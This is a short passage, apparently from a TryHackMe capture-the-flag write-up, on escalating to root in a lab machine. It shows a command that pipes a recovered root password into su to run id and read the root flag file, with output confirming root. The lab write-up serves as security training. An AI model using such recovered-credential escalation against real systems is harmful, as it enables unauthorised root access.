4.6 Privilege Escalation to Root
Direct root SSH login was disabled on the target (`PermitRootLogin no`). The recovered root password was instead used with `su` from the `sysadmin` shell:
```bash
echo 'XXXXXX' | su -c 'id && cat /root/root.txt' root
```
Result:
```
uid=0(root) gid=0(root) groups=0(root)
THM{}
```
Full root access achieved.
